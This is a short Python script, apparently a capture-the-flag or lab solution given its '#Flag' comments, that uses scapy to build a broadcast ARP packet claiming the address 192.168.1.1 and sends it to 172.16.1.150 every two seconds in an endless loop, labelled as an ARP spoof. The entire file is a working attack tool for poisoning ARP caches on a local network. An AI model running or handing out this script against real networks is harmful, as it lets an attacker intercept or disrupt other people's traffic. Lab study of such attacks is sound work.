from scapy.all import *
import time
#Flag1
eth = Ether()
eth.dst = 'ff:ff:ff:ff:ff:ff'
#Flag2=F1.F2
#Flag3
eth.type = 0x0806
#Flag4=F3.F4
arp = ARP()
arp.psrc = '192.168.1.1'
arp.pdst = '172.16.1.150'
packet = eth/arp
#Flag5=F5.F6.F7.F8.F9.F10.F11

while True:
	sendp(packet)
	print('Sending ARP Spoof......')
	time.sleep(2)


